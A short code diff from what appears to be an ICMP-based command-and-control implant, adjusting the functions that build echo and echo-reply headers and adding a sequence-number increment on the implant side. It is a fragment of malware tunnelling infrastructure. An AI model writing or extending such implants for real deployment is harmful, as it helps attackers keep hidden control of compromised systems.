@@ -108,7 +108,9 @@ unsigned char *parse_data_section(unsigned char *packet) {
 void c2_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
     icmp->type = ICMP_ECHOREPLY;
     icmp->code = ICMP_ECHO;
+
     icmp->un.echo.id = RAND_ID;
+
     icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
 }
@@ -117,7 +119,10 @@ void c2_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
 void implant_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
     icmp->type = ICMP_ECHO;
     icmp->code = ICMP_ECHO;
+
     icmp->un.echo.id = RAND_ID;
+    icmp->un.echo.sequence++;
+
     icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
 }
